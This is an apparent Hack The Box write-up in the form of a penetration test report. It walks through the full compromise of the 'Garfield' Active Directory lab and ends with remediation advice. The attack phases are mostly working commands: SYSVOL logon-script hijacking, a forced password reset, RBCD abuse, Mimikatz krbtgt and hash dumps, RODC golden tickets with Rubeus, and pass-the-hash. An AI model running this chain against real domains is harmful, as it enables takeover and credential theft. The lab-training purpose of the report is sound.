# Penetration Test Report
## Hack The Box — Garfield (Hard, Windows, Active Directory)

**Date:** April 8, 2026  
**Tester:** [Your Name]  
**Classification:** CTF/Educational Lab Report

---

## Executive Summary

The Garfield machine on Hack The Box is a Hard-rated Windows Active Directory environment simulating a corporate domain with a primary Domain Controller (DC01) and a Read-Only Domain Controller (RODC01). Full domain compromise was achieved through a chain of misconfigurations including logon script hijacking, password reset abuse, RBCD delegation, RODC key extraction, and Password Replication Policy manipulation.

**User Flag:** `3b26bbdefc9a1b5691be65ace30c5a31`  
**Root Flag:** `90fc0ce4ff71e2c8f0e9b23a3f1ebb14`

---

## Infrastructure Overview

| Host | Role | IP |
|------|------|----|
| DC01.garfield.htb | Primary Domain Controller | 10.129.x.x (dynamic) |
| RODC01.garfield.htb | Read-Only Domain Controller | 192.168.100.2 (internal) |

**Domain:** garfield.htb  
**Initial Credentials:** j.arbuckle / Th1sD4mnC4t!@1978

---

## Attack Chain

### Phase 1 — Initial Foothold (l.wilson)

**Vulnerability:** Logon Script Hijacking via scriptPath attribute write

j.arbuckle had write access to the SYSVOL scripts folder and could modify the `scriptPath` attribute of domain users via LDAP. A Base64-encoded PowerShell reverse shell was uploaded to `\\DC01\SYSVOL\garfield.htb\scripts\login.bat` and l.wilson's `scriptPath` attribute was set to trigger it on logon.

**Tools:** bloodyAD, smbclient, nc  
**Commands:**
```bash
smbclient //DC01/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' \
  -c 'cd garfield.htb\scripts; put login.bat login.bat'

bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb \
  --host DC01 set object l.wilson scriptPath -v 'login.bat'
```

---

### Phase 2 — Lateral Movement (l.wilson → l.wilson_adm)

**Vulnerability:** ForceChangePassword right on l.wilson_adm

BloodHound enumeration revealed l.wilson had `ForceChangePassword` rights over l.wilson_adm. From the reverse shell:

```powershell
$s = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $s -Reset
```

Evil-WinRM was then used to log in as l.wilson_adm and retrieve the user flag from `C:\Users\l.wilson_adm\Desktop\user.txt`.

---

### Phase 3 — RODC Compromise via RBCD

**Vulnerability:** WriteAccountRestrictions over RODC01$ + RODC Administrators membership

l.wilson_adm had `WriteAccountRestrictions` over RODC01$ and self-add rights to the RODC Administrators group:

```bash
# Add to RODC Administrators
bloodyAD --host DC01 -u l.wilson_adm -p 'NewPass123!' \
  -d garfield.htb add groupMember "RODC Administrators" l.wilson_adm

# Create fake machine account and configure RBCD
impacket-addcomputer garfield.htb/l.wilson_adm:'NewPass123!' \
  -computer-name 'EVILPC$' -computer-pass 'Password123!'

impacket-rbcd garfield.htb/l.wilson_adm:'NewPass123!' \
  -action write -delegate-to 'RODC01$' -delegate-from 'EVILPC$'

# Get service ticket impersonating Administrator on RODC01
impacket-getST garfield.htb/'EVILPC$':'Password123!' \
  -spn 'cifs/RODC01.garfield.htb' -impersonate Administrator

# Access RODC01 via wmiexec
proxychains impacket-wmiexec -k -no-pass \
  garfield.htb/Administrator@RODC01.garfield.htb
```

---

### Phase 4 — RODC krbtgt Key Extraction

**Tool:** Mimikatz on RODC01

From the SYSTEM shell on RODC01:

```
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt_8245
```

**krbtgt_8245 AES256 key:** `d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240`  
**RODC ID:** 8245

---

### Phase 5 — Password Replication Policy Modification

**Vulnerability:** RODC Administrators can modify PRP via repadmin

```bash
# Add Administrator to the allow list
repadmin /prp add RODC01 allow \
  "CN=Administrator,CN=Users,DC=garfield,DC=htb"

# Remove Administrators builtin from NeverReveal list
bloodyAD set object "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" \
  msDS-NeverRevealGroup \
  -v "CN=Account Operators,CN=Builtin,DC=garfield,DC=htb" \
  -v "CN=Server Operators,CN=Builtin,DC=garfield,DC=htb" \
  -v "CN=Backup Operators,CN=Builtin,DC=garfield,DC=htb"
```

---

### Phase 6 — RODC Golden Ticket & Forced Replication

**Tool:** Rubeus on RODC01

```
Rubeus.exe golden /rodcNumber:8245 \
  /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 \
  /user:Administrator /id:500 \
  /domain:garfield.htb \
  /sid:S-1-5-21-2502726253-3859040611-225969357 /nowrap

# Inject ticket
Rubeus.exe ptt /ticket:<base64_ticket>

# Force credential replication to RODC01
repadmin /rodcpwdrepl RODC01 DC01 \
  "CN=Administrator,CN=Users,DC=garfield,DC=htb"
```

**Result:** `Successfully replicated secrets for user Administrator`

---

### Phase 7 — Domain Administrator Hash Extraction

```
mimikatz # lsadump::lsa /inject /name:Administrator
```

**Administrator NT Hash:** `ee238f6debc752010428f20875b092d5`

---

### Phase 8 — Domain Compromise

```bash
impacket-psexec garfield.htb/Administrator@DC01 \
  -hashes aad3b435b51404eeaad3b435b51404ee:ee238f6debc752010428f20875b092d5
```

**Root Flag:** `90fc0ce4ff71e2c8f0e9b23a3f1ebb14`

---

## Vulnerability Summary

| # | Vulnerability | Severity | Impact |
|---|---------------|----------|--------|
| 1 | Logon Script Write Access via scriptPath | High | Initial foothold |
| 2 | ForceChangePassword on privileged account | High | Lateral movement |
| 3 | WriteAccountRestrictions over RODC$ | High | RBCD attack |
| 4 | RODC Administrators self-add right | High | PRP manipulation |
| 5 | Weak RODC Password Replication Policy | Critical | Domain compromise |
| 6 | RODC krbtgt key exposure via LSASS | Critical | Golden ticket forgery |

---

## Recommendations

1. **Remove scriptPath write access** for non-administrative accounts on SYSVOL.
2. **Audit ForceChangePassword delegations** — restrict to dedicated service accounts only.
3. **Restrict WriteAccountRestrictions** on RODC computer objects to Domain Admins only.
4. **Harden RODC Password Replication Policy** — ensure sensitive accounts (Domain Admins, Enterprise Admins, Administrator) remain in the Denied RODC Password Replication Group permanently.
5. **Monitor RODC credential replication** — alert on `repadmin /rodcpwdrepl` usage for sensitive accounts.
6. **Restrict RODC Administrators group** membership and audit self-add rights.
7. **Enable Protected Users security group** for Administrator and other privileged accounts to prevent credential caching on RODCs.

---

## Tools Used

- Impacket (secretsdump, getST, psexec, wmiexec, addcomputer, rbcd)
- Mimikatz
- Rubeus v2.2.0
- bloodyAD
- Evil-WinRM
- chisel (tunneling)
- BloodHound/bloodyAD (AD enumeration)
- nmap, smbclient, rpcclient

---

*This report was produced as part of an authorized Hack The Box lab exercise. All activities were conducted in a controlled, legal environment.*
